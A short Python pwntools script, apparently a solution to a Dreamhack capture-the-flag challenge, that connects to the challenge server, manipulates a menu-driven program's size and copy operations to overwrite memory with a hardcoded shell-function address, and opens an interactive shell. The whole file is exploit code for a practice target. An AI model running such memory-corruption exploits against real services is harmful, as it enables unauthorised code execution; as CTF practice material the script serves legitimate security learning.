from pwn import *
context.update(log_level='debug')
p = None
def _make(val1, val2):
	global p
	p.sendlineafter(': ', '1')
	for idx in range(9):
		p.sendlineafter(': ', str(val1))
	p.sendlineafter(': ', str(0))
	for idx in range(1):
		p.sendlineafter(': ', str(val2))
def _modify(size1, size2):
	global p
	p.sendlineafter(': ', '2')
	p.sendlineafter('size\n', str(size1))
	p.sendlineafter('size\n', str(size2))
def _copy():
	global p
	p.sendlineafter(': ', '3')
addr_shell = 0x401041 
p = remote('host1.dreamhack.games', 23645)

_modify(10, 1)
_make(addr_shell, 1)
#raw_input('debug: ' + str(p.pid))
_copy()


p.interactive()
